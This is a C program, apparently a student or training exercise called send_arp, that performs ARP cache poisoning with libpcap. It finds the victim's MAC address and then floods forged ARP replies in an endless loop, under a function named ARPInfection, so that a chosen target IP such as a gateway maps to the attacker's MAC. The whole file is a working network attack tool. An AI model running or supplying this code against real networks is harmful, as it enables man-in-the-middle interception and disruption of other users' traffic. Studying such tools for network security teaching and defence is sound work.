#include <stdio.h>
#include <string.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>

#include <pcap.h>
#include <netinet/ip.h>
#include <netinet/if_ether.h>
#include <net/if_arp.h>
#include <arpa/inet.h>
#include <stdint.h>

#define HWTYPE_ETHER   0x01
#define IP_LENGTH	   0x04
#define ETHER_LENGTH   0x06
#define ETHERTYPE_IP   0x0800
#define ETHERTYPE_ARP  0x0806

void usage()
{
	printf("Usage: send_arp <interface> <sender ip> <target ip>\n");
	printf("ex:    send_arp wlan0 192.168.10.2 192.168.10.1\n");
}

void GetMyInfo(char* dev,unsigned char *my_mac, struct in_addr *my_ip){
    struct ifreq s;
    int fd = socket(PF_INET, SOCK_STREAM, 0);
    strcpy(s.ifr_name, dev);
    if (ioctl(fd, SIOCGIFHWADDR, &s)) {
        printf("Can't Get Mac Address!!\n");
        exit(1);
    }
    memcpy(my_mac, s.ifr_addr.sa_data, 6);
    if (ioctl(fd, SIOCGIFADDR, &s)) {
        printf("Can't Get IP Address!!\n");
        exit(1);
    }
    memcpy(my_ip, (const void*)&(((sockaddr_in *)&s.ifr_addr)->sin_addr), 4);
}

void SendPacket(pcap_t* handle, in_addr *src_ip, in_addr *dst_ip, unsigned char *srcMac, unsigned char *dstMac, unsigned short opcode)
{
	unsigned char packet[ETHERMTU];
	struct ether_header *eth_h;
	struct ether_arp *arp_h;

	memset(packet, 0, ETHERMTU);

	eth_h = (struct ether_header*)packet;
	memcpy(eth_h->ether_dhost, dstMac, 6);
	memcpy(eth_h->ether_shost, srcMac, 6);
	eth_h->ether_type = htons(ETHERTYPE_ARP);

	arp_h = (struct ether_arp*)(packet + sizeof(struct ether_header));
	arp_h->ea_hdr.ar_hrd = htons(HWTYPE_ETHER);
	arp_h->ea_hdr.ar_pro = htons(ETHERTYPE_IP);
	arp_h->ea_hdr.ar_hln = ETHER_LENGTH;
	arp_h->ea_hdr.ar_pln = IP_LENGTH;
	arp_h->ea_hdr.ar_op = htons(opcode);
	memcpy(arp_h->arp_sha, srcMac, 6);
	memcpy(arp_h->arp_spa, src_ip, 4);
	if(!memcmp(dstMac, "\xff\xff\xff\xff\xff\xff", 6))
		memcpy(arp_h->arp_tha, "\x00\x00\x00\x00\x00\x00", 6);
	else
		memcpy(arp_h->arp_tha, dstMac, 6);
	memcpy(arp_h->arp_tpa, dst_ip, 4);

	if(pcap_sendpacket(handle, packet, sizeof(struct ether_header)+ sizeof(struct ether_arp)))
		printf("SendPacket Failed\n");
	else
		printf("SendPacket Success!\n");
	//sleep(3);
}

void GetTargetMac(char *dev, in_addr *src_ip, in_addr *dst_ip, unsigned char *srcMac, unsigned char *dstMac)
{
	char errbuf[PCAP_ERRBUF_SIZE];
	unsigned char broadcast[7] = "\xff\xff\xff\xff\xff\xff";

	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == NULL) {
	  fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
	  exit(1);
	}

  	while (true) {
		struct pcap_pkthdr* header;
		struct ether_header* eth_h;
	    struct ether_arp* arp_h;

	    const u_char* packet;
	    unsigned short eth_type;

	    SendPacket(handle, src_ip, dst_ip, srcMac, broadcast, 1);
	    int res = pcap_next_ex(handle, &header, &packet);
	    if (res == 0) continue;
	    if (res == -1 || res == -2) break;

	    eth_h = (struct ether_header*)packet;
	    eth_type = htons(eth_h->ether_type);
	    if (eth_type == ETHERTYPE_ARP)
	    {
	      arp_h = (struct ether_arp*)(packet + sizeof(struct ether_header));
	      if(!memcmp(dst_ip, arp_h->arp_spa, 4))
	      {
	      	memcpy(dstMac, arp_h->arp_sha, 6);
	      	pcap_close(handle);
	      	return;
	      }
    	}
  	}
  pcap_close(handle);
}

void ARPInfection(char *dev, in_addr *src_ip, in_addr *dst_ip, unsigned char *srcMac, unsigned char *dstMac)
{

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == NULL) {
	  fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
	  exit(1);
	}
	while(true)
		SendPacket(handle, src_ip, dst_ip, srcMac, dstMac, 2);
	pcap_close(handle);
}

int main(int argc, char *argv[])
{
	char *dev;
	struct in_addr sender_ip;
	struct in_addr target_ip;
	struct in_addr LocalIP;
	unsigned char LocalMac[6];
	unsigned char SenderMac[6];

	if(argc != 4)
	{
		usage();
		return 0;
	}

	dev = argv[1];
	inet_aton(argv[2], &sender_ip);
	inet_aton(argv[3], &target_ip);
	
	GetMyInfo(dev, LocalMac, &LocalIP);
	GetTargetMac(dev, &LocalIP, &sender_ip, LocalMac, SenderMac);
	ARPInfection(dev, &target_ip, &sender_ip, LocalMac, SenderMac);
}
